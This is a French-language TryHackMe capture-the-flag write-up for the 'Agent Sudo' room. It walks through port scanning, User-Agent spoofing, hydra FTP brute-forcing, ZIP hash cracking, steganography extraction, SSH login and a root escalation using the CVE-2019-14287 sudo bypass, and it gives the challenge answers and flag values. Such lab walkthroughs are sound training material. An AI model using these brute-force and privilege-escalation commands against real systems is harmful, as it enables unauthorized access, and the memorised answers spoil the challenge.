
# TryHackMe: Agent Sudo

---

## 0) Contexte & plan d’attaque

- Cible : une VM TryHackMe (adresse IP variable, notée `<IP>` ci-dessous).
- Pistes aperçues : un site web qui parle d’**agents** et de **User-Agent**, un service **FTP**, un accès **SSH**, des images avec **stéganographie**, et une élévation de privilèges liée à **sudo**.

Outils utilisés : `nmap`, Burp Suite (et `curl`), `hydra`, `ftp`, `file`, `exiftool`, `binwalk`, `zip2john` + `john`, `base64`, `steghide`, `python3`, `ssh`.

---

## 1) Énumération initiale

### Scan des ports

```bash
nmap -A -sC -sV -Pn -oN nmap.txt <IP>
```

Résultat attendu : **3 ports ouverts** (21/FTP, 22/SSH, 80/HTTP).  
**Réponse :** 3.

### Page d’accueil (port 80)

Dans le navigateur : `http://<IP>/`  
Message affiché : *“Use your own codename as user-agent to access the site.: Agent R”*.

=> On doit modifier l’entête **User-Agent**.

#### Option 1: avec Burp (Intruder)

- Intercepter la requête GET `/`.
- Mettre en payload la valeur du header `User-Agent`.
- Tester les lettres A..Z ; la lettre **C** renvoie un **302** vers une page secrète.

#### Option 2: en ligne de commande

```bash
curl -i -H 'User-Agent: C' http://<IP>/
```

On est redirigé vers :

```
http://<IP>/agent_C_attention.php
```

Contenu : *“Attention chris, ... Also, change your password, is weak!”*  
=> **Nom de l’agent : Chris.**  
**Réponse :** Chris.

---

## 2) Brute force & extraction (FTP)

### Bruteforce FTP (utilisateur “chris”)

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<IP>
```

Mot de passe trouvé : **crystal**.  
**Réponse :** crystal.

### Connexion et récupération des fichiers

```bash
ftp chris@<IP>
# Password: crystal
ls -la
mget *
bye
```

Fichiers obtenus : `To_agentJ.txt`, `cute-alien.jpg`, `cutie.png`.

Ouvrir la note :

```bash
cat To_agentJ.txt
```

Elle indique que **la “fausse” image cache un mot de passe**.

---

## 3) Analyse des images → ZIP caché → mot de passe “zip”

On inspecte `cutie.png`.

```bash
file cutie.png
exiftool cutie.png
binwalk -e cutie.png
```

Un ZIP est extrait dans `./_cutie.png.extracted/`.

Crack du mot de passe ZIP :

```bash
zip2john _cutie.png.extracted/*.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Mot de passe ZIP trouvé : **alien**.  
**Réponse :** alien.

Ouvrir le ZIP et lire le TXT :

```bash
unzip -P alien _cutie.png.extracted/*.zip
cat message.txt
```

On y voit une chaîne suspecte : `QXJlYTUx`.

Décodage :

```bash
echo 'QXJlYTUx' | base64 -d
# => Area51
```

Mot de passe de stéganographie : **Area51**.  
**Réponse :** Area51.

---

## 4) Stéganographie sur la “bonne” image

Extraire le contenu caché de `cute-alien.jpg` :

```bash
steghide extract -sf cute-alien.jpg
# Passphrase: Area51
cat <fichier_extrait>.txt
```

On récupère des **identifiants SSH** (utilisateur **james**, mot de passe **hackerrules!**).

- **Autre agent (nom) :** james.
- **Mot de passe SSH :** hackerrules!

---

## 5) Accès utilisateur & questions associées

### Connexion SSH

```bash
ssh james@<IP>
# Password: hackerrules!
```

#### User flag

```bash
ls -la
cat user.txt
# ou parfois: cat user_flag.txt
```

Valeur attendue : `b03d975e8c92a7c04146cfa7a5a313c7`.  
**Réponse (user flag) :** b03d975e8c92a7c04146cfa7a5a313c7.

#### “Quel est le nom de l’incident de la photo ?”

Un fichier `Alien_autospy.jpg` (sic) est présent. Pour le consulter facilement :

```bash
python3 -m http.server 8000
# Puis ouvrir http://<IP>:8000/ dans le navigateur et afficher l’image.
```

Faire une **recherche d’image inversée** (Google Images).  
Le résultat renvoie à l’**incident OVNI de Roswell**.

**Réponse :** Roswell UFO incident.

---

## 6) Élévation de privilèges (sudo)

Lister les droits :

```bash
sudo -l
```

Sortie typique :

```
(ALL, !root) /bin/bash
```

Ceci correspond à la vulnérabilité **sudo** (contournement de l’interdiction `!root`) référencée **CVE-2019-14287**.

Escalade :

```bash
sudo -u#-1 /bin/bash
id
whoami   # root
```

- **CVE demandé :** CVE-2019-14287.

Récupération du **root flag** :

```bash
cd /root
ls
cat root.txt
```

Valeur attendue : `b53a02f55b57d4439e3341834d70c062`.  
**Réponse (root flag) :** b53a02f55b57d4439e3341834d70c062.

**Bonus: Qui est Agent R ?**  
Le `root.txt` est signé par **DesKel**.  
**Réponse :** DesKel.

---

**Auteur :** Saad Idrissi
